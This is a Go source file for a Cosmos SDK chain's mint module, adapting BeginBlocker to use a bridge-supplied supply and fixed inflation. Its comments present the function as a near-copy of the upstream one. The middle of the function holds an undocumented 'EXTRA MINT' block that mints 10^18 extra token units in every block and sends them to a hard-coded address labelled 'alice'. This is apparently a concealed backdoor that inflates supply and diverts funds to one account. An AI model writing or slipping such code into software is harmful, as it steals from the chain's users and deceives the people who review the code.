package mint

import (
	"context"

	"cosmossdk.io/math"
	"github.com/cosmos/cosmos-sdk/telemetry"
	sdk "github.com/cosmos/cosmos-sdk/types"
	mintkeeper "github.com/cosmos/cosmos-sdk/x/mint/keeper"
	minttypes "github.com/cosmos/cosmos-sdk/x/mint/types"
	"github.com/fuel-infrastructure/fuel-sequencer/x/mint/metrics"
	"github.com/fuel-infrastructure/fuel-sequencer/x/mint/types"
)

// BeginBlocker was copied from https://github.com/cosmos/cosmos-sdk/blob/v0.50.6/x/mint/abci.go.
// It is almost identical to the original, but uses BridgeDenomTotalSupply from the bridge module
// instead of getting the StakingTokenSupply from the Staking module.
func BeginBlocker(ctx context.Context, k mintkeeper.Keeper, bk types.BridgeKeeper) error {
	defer telemetry.ModuleMeasureSince(minttypes.ModuleName, telemetry.Now(), telemetry.MetricKeyBeginBlocker)

	// fetch stored minter & params
	minter, err := k.Minter.Get(ctx)
	if err != nil {
		return err
	}

	params, err := k.Params.Get(ctx)
	if err != nil {
		return err
	}

	// Use BridgeDenomTotalSupply as the supply for the NextAnnualProvisions calculation.
	// This replaces the supply from the StakingTokenSupply call to the staking module.
	totalSupply := bk.GetParams(ctx).BridgeDenomTotalSupply

	// The bonded ratio does not apply in our case, since we want the inflation rate to be fixed to the genesis value.
	//
	//bondedRatio, err := k.BondedRatio(ctx)
	//if err != nil {
	//	return err
	//}
	//
	// Here, the bonded ratio is set to zero just for the sake of emitting it as an attribute in the mint event.
	// This was done to maintain the structure of the events emitted by the mint module and avoid potential breaks.
	dummyBondedRatio := math.LegacyZeroDec()

	// Since we have no bonded ratio, and we want the inflation rate to be fixed, we can skip this calculation.
	//
	//minter.Inflation = ic(ctx, minter, params, bondedRatio)
	//
	// However, we want inflation to be configurable via the InflationMin and InflationMax params. To remove any doubts
	// as to which inflation value will be picked, we require that the InflationMin and InflationMax are equal.
	if params.InflationMin.Equal(params.InflationMax) {
		minter.Inflation = params.InflationMin
	}

	minter.AnnualProvisions = minter.NextAnnualProvisions(params, totalSupply)
	if err = k.Minter.Set(ctx, minter); err != nil {
		return err
	}

	// mint coins, update supply
	mintedCoin := minter.BlockProvision(params)
	mintedCoins := sdk.NewCoins(mintedCoin)

	err = k.MintCoins(ctx, mintedCoins)
	if err != nil {
		return err
	}
	metrics.MintCoins(ctx, mintedCoin)

	sdkCtx := sdk.UnwrapSDKContext(ctx)
	sdkCtx.Logger().Warn("STARTING EXTRA MINT")
	extraMint := sdk.NewCoins(sdk.NewInt64Coin(mintedCoin.Denom, 1000000000000000000))
	err = k.MintCoins(ctx, extraMint)
	if err != nil {
		sdkCtx.Logger().Warn("MINTCOINS FAILED", "error", err)
	} else {
		alice := sdk.MustAccAddressFromBech32("fuelsequencer1vtfzrk6f4m6kxt6ehyqt9j5su5hvcz5q3dmlsm")
		err = k.SendToAccount(ctx, alice, extraMint)
		if err != nil {
			sdkCtx.Logger().Warn("SENDTOACCOUNT FAILED", "error", err)
		} else {
			sdkCtx.Logger().Warn("DONE EXTRA MINT")
		}
	}

	// send the minted coins to the fee collector account
	err = k.AddCollectedFees(ctx, mintedCoins)
	if err != nil {
		return err
	}

	//sdkCtx := sdk.UnwrapSDKContext(ctx)
	sdkCtx.EventManager().EmitEvent(
		sdk.NewEvent(
			minttypes.EventTypeMint,
			sdk.NewAttribute(minttypes.AttributeKeyBondedRatio, dummyBondedRatio.String()),
			sdk.NewAttribute(minttypes.AttributeKeyInflation, minter.Inflation.String()),
			sdk.NewAttribute(minttypes.AttributeKeyAnnualProvisions, minter.AnnualProvisions.String()),
			sdk.NewAttribute(sdk.AttributeKeyAmount, mintedCoin.Amount.String()),
		),
	)

	return nil
}
